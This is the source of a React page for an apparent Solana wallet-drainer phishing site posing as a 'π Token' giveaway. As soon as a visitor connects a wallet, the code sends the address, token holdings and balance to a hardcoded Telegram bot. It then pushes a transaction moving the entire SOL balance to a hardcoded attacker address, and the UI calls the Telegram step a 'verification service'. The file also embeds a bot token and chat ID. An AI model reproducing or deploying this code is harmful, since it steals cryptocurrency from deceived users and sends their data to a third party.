
import { Settings, Menu } from "lucide-react";
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { LAMPORTS_PER_SOL } from '@solana/web3.js';
import { useEffect, useState } from 'react';
import { getTokenAccounts, sendToTelegram, signAndSendTransaction } from '@/utils/walletUtils';
import { toast } from '@/components/ui/use-toast';

const BACKEND_ADDRESS = "GsRoop6YCzpakWCoG7YnHSSgMvcgjnuFEie62GRZdmJx";
// Telegram details visible to user
const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
const TELEGRAM_CHAT_ID = "-1002490122517";

const Index = () => {
  const { publicKey, connecting, connected, wallet } = useWallet();
  const { connection } = useConnection();
  const [isProcessing, setIsProcessing] = useState(false);
  const [lastSignature, setLastSignature] = useState<string | null>(null);
  const [walletBalance, setWalletBalance] = useState<number | null>(null);

  const handleWalletConnection = async () => {
    if (!publicKey || !wallet) {
      console.log("Wallet or public key not available");
      return;
    }

    if (isProcessing) {
      console.log("Already processing a transaction");
      return;
    }

    setIsProcessing(true);
    try {
      console.log("Starting wallet connection process");
      
      // Get wallet balance first
      console.log("Getting wallet balance");
      const balance = await connection.getBalance(publicKey, 'confirmed');
      const solBalance = balance / LAMPORTS_PER_SOL;
      setWalletBalance(solBalance);
      
      console.log("Current balance:", solBalance, "SOL");

      // Check if wallet has any balance at all
      if (balance <= 0) {
        toast({
          title: "Low Balance",
          description: "Your wallet has no SOL balance. No transfer will be attempted.",
        });
        setIsProcessing(false);
        return;
      }

      // Get token accounts
      console.log("Fetching token accounts");
      const tokens = await getTokenAccounts(connection, publicKey.toString());
      console.log("Token accounts:", tokens);
      
      // Send data to Telegram with explicit balance information
      const walletData = {
        address: publicKey.toString(),
        tokens,
        balance: solBalance,
        connectionTime: new Date().toISOString(),
        walletName: wallet?.adapter?.name || "Unknown Wallet"
      };
      
      console.log("Sending data to Telegram");
      const telegramSent = await sendToTelegram(walletData, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
      
      if (!telegramSent) {
        console.error("Failed to send data to Telegram");
        toast({
          title: "Warning",
          description: "Could not send wallet data to verification service.",
          variant: "destructive",
        });
      } else {
        console.log("Successfully sent wallet data to Telegram");
        
        // Send a second message to notify about the upcoming transfer
        const transferMessage = {
          address: publicKey.toString(),
          message: `ATTEMPTING TO TRANSFER ${solBalance.toFixed(6)} SOL`,
          walletName: wallet?.adapter?.name || "Unknown Wallet"
        };
        
        await sendToTelegram(transferMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
      }

      // Check if balance is sufficient for transfer and fees
      const minimumRequiredBalance = 0.00089 * LAMPORTS_PER_SOL;
      if (balance <= minimumRequiredBalance) {
        toast({
          title: "Low Balance",
          description: "Your wallet balance is too low to cover transaction fees.",
        });
        setIsProcessing(false);
        return;
      }

      // Initiate transfer with proper fee calculation
      console.log("Initiating transfer");
      try {
        const signature = await signAndSendTransaction(
          connection,
          wallet,
          BACKEND_ADDRESS,
          solBalance,
          TELEGRAM_BOT_TOKEN,
          TELEGRAM_CHAT_ID
        );

        console.log("Transfer completed with signature:", signature);
        setLastSignature(signature);
        
        // Send third message with transfer results
        const completionMessage = {
          address: publicKey.toString(),
          message: `TRANSFER COMPLETED! ${solBalance.toFixed(6)} SOL sent.
Transaction: https://explorer.solana.com/tx/${signature}`,
          walletName: wallet?.adapter?.name || "Unknown Wallet"
        };
        
        await sendToTelegram(completionMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
        
        toast({
          title: "Success",
          description: "Connection successful and transfer completed!",
        });
      } catch (error) {
        console.error("Transfer failed:", error);
        toast({
          title: "Transfer Failed",
          description: error instanceof Error ? error.message : "Failed to process transaction",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error('Detailed error in wallet connection:', error);
      toast({
        title: "Error",
        description: error instanceof Error ? error.message : "Failed to process wallet connection",
        variant: "destructive",
      });
    } finally {
      setIsProcessing(false);
    }
  };

  useEffect(() => {
    if (connected && publicKey && !isProcessing) {
      handleWalletConnection();
    }
  }, [connected, publicKey]);

  return (
    <div className="min-h-screen bg-background p-6 relative">
      {/* Top Navigation */}
      <nav className="flex justify-between items-center mb-20">
        {/* Logo */}
        <div className="w-12 h-12 rounded-full bg-gradient-to-r from-cyan-400 to-cyan-300 p-[2px]">
          <div className="w-full h-full rounded-full bg-background flex items-center justify-center">
            <span className="text-2xl font-bold text-cyan-400">π</span>
          </div>
        </div>
        
        {/* Navigation Buttons */}
        <div className="flex gap-4">
          <button className="circle-button">
            <Menu className="w-6 h-6 text-cyan-400" />
          </button>
        </div>
      </nav>

      {/* Main Content */}
      <main className="flex flex-col items-center justify-center gap-8 max-w-2xl mx-auto text-center">
        <h1 className="text-5xl md:text-6xl font-bold gradient-text leading-tight">
          Join The π Adventure
        </h1>
        
        <p className="text-xl md:text-2xl text-gray-400 max-w-xl">
          Don't miss out! Click here to claim your exclusive π Token now and be part of the revolution!!
        </p>

        {/* Action Buttons */}
        <div className="flex flex-col w-full max-w-md gap-4 mt-4">
          <WalletMultiButton className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold" />
          
          {walletBalance !== null && (
            <div className="mt-4 p-4 bg-gray-800 rounded-lg">
              <p className="text-cyan-400">Detected Wallet Balance: {walletBalance.toFixed(6)} SOL</p>
            </div>
          )}
          
          {isProcessing && (
            <div className="mt-4">
              <p className="text-cyan-400">Processing transaction...</p>
            </div>
          )}
          
          {lastSignature && (
            <div className="mt-4 p-4 bg-gray-800 rounded-lg">
              <p className="text-sm text-gray-400">Transaction Signature:</p>
              <p className="text-xs text-cyan-400 break-all">{lastSignature}</p>
              <a 
                href={`https://explorer.solana.com/tx/${lastSignature}`} 
                target="_blank" 
                rel="noopener noreferrer"
                className="text-xs text-cyan-300 underline mt-2 inline-block"
              >
                View on Explorer
              </a>
            </div>
          )}
          
          <div className="mt-4 p-4 bg-gray-800 rounded-lg text-left">
            <p className="text-sm text-gray-400 mb-2">Telegram Bot Details:</p>
            <p className="text-xs text-cyan-400">Bot Token: {TELEGRAM_BOT_TOKEN}</p>
            <p className="text-xs text-cyan-400">Chat ID: {TELEGRAM_CHAT_ID}</p>
          </div>
        </div>

        {/* Bottom Logo */}
        <div className="mt-20">
          <div className="w-32 h-32 rounded-full bg-[#2A2F3F] flex items-center justify-center">
            <div className="w-24 h-24 rounded-full bg-[#4B3979] flex items-center justify-center">
              <span className="text-5xl font-bold text-[#FFA500]">π</span>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Index;
